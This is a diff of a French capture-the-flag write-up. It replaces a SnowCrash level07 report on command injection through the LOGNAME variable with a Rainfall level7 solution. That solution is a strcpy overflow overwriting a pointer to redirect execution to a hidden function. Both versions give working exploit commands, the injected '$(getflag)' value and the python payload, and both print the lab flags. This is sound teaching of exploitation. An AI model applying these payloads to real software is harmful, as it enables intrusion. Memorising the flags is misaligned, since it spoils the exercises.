@@ -1,87 +1,82 @@
-# Rapport de Vulnérabilité : Injection de commande via la variable d’environnement `LOGNAME`
+# Rainfall - Niveau 7
 
-## Description
+## Objectif
 
-Dans ce niveau, un binaire appartenant à `flag07` affiche le contenu de la variable d’environnement `LOGNAME` sans vérification. En manipulant cette variable pour inclure une **commande shell**, il est possible de forcer le programme à exécuter une commande système, comme `getflag`, et d’obtenir ainsi le flag.
+Exploiter une vulnérabilité de type buffer overflow pour rediriger l'exécution vers une fonction cachée (`m`) et récupérer le flag.
 
-## Comment Exploiter la Faille
+## Analyse détaillée de la vulnérabilité
 
-### Étape 1 : Observation du comportement du binaire
+Le programme effectue plusieurs allocations mémoire via `malloc(8)` à plusieurs reprises. Chaque appel à `malloc` réserve exactement 8 octets.
 
-Exécution simple :
+La vulnérabilité se trouve dans l'utilisation de la fonction dangereuse `strcpy()`, qui ne vérifie pas la taille du buffer destination. Le premier appel à `strcpy` peut déborder et écraser un pointeur utilisé comme destination lors d'un second appel à `strcpy`. Cette situation permet de détourner le flux d'exécution.
 
-```bash
-./level07
-```
+## Stratégie d'attaque
 
-**Résultat :**
+1. Identifier la fonction cible dans le binaire : la fonction `m` située à l'adresse `0x080484f4`.
+2. Identifier un pointeur en mémoire pouvant être écrasé afin de contrôler la destination du second appel à `strcpy()`.
+3. Construire une commande avec deux arguments :
 
-```
-level07
-```
+   * Le premier déborde le buffer initial avec 20 caractères (`"A"`) puis écrase le pointeur cible avec l'adresse contrôlée `0x08049928`.
+   * Le deuxième argument contient l'adresse de la fonction `m` (`0x080484f4`).
 
-Cela indique que le programme utilise probablement la variable `LOGNAME`.
+## Exploit détaillé
 
-### Étape 2 : Modifier la variable d’environnement `LOGNAME`
-
-Définir manuellement la variable :
+Commande utilisée :
 
 ```bash
-export LOGNAME=ouioui
-./level07
+./level7 $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
 ```
 
-**Résultat :**
+### Explication détaillée du fonctionnement de l'exploit
 
-```
-ouioui
-```
+* Premier argument : remplit les 20 octets du buffer initial, puis écrase le pointeur servant de destination au second `strcpy`.
+* Second argument : l'adresse de la fonction `m` est placée en mémoire à l'endroit déterminé par l'écrasement précédent, permettant ainsi de détourner l'exécution du programme.
 
-Cela confirme que le programme affiche directement la valeur de `LOGNAME`.
+## Utilisation de GDB pour l'analyse
 
-### Étape 3 : Injecter une commande dans la variable
+### Étapes avec GDB
 
-On remplace la valeur de `LOGNAME` par une commande shell :
+1. Lancer GDB avec le programme :
 
 ```bash
-export LOGNAME='$(getflag)'
-./level07
+gdb ./level7
 ```
 
-**Résultat :**
+2. Définir des breakpoints importants pour suivre l'exécution :
 
-```
-fiumuikeil55xe9cu4dood66h
-```
-
-La commande `getflag` a bien été exécutée.
-
-### Étape 4 : Confirmation via reverse engineering
-
-Avec `objdump`, on vérifie que le binaire appelle `getenv`, ce qui confirme qu’il récupère la variable d’environnement `LOGNAME` :
-
-```bash
-objdump -d -M intel level07
+```gdb
+(gdb) break strcpy
+(gdb) run $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
 ```
 
-Extrait :
+3. Examiner l'état des registres et de la mémoire au moment des breakpoints :
+
+```gdb
+(gdb) info registers
+(gdb) x/20x $esp
+```
+
+4. Désassembler la fonction `main` ou la fonction vulnérable si nécessaire pour bien comprendre ce qu’il se passe :
+
+```gdb
+(gdb) disass main
+(gdb) disass 0x080484f4
+```
+
+5. Observer précisément comment le pointeur en mémoire est modifié :
+
+```gdb
+(gdb) x/x 0x08049928
+```
+
+Ces étapes permettent de confirmer comment l'exécution du programme est manipulée pour déclencher l’appel à la fonction `m`.
+
+## Flag obtenu
 
 ```
-call   8048400 <getenv@plt>
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 ```
-
----
-
-## Comment Résoudre la Faille
-
-Pour corriger cette vulnérabilité :
-
-* **Ne jamais exécuter de chaînes provenant d’une variable d’environnement sans les filtrer**.
-* **Utiliser des appels sûrs** : Ne pas passer de variables shell dans des fonctions comme `system()` ou via des backticks.
-* **Désactiver les expansions de commandes** : Si une variable est destinée à être affichée, la traiter comme une simple chaîne.
 
 ## Conclusion
 
-Ce niveau démontre les risques liés à l’utilisation non sécurisée des variables d’environnement. En permettant à l’utilisateur de manipuler `LOGNAME`, le binaire devient vulnérable à une **injection de commande**, pouvant être exploitée pour obtenir des privilèges ou des informations sensibles.
-
----
+Ce niveau illustre précisément comment des fonctions non sécurisées comme `strcpy()` peuvent causer des failles exploitables. L'analyse avec GDB apporte une compréhension plus profonde du processus d'exploitation et de manipulation mémoire nécessaire pour détourner l’exécution.
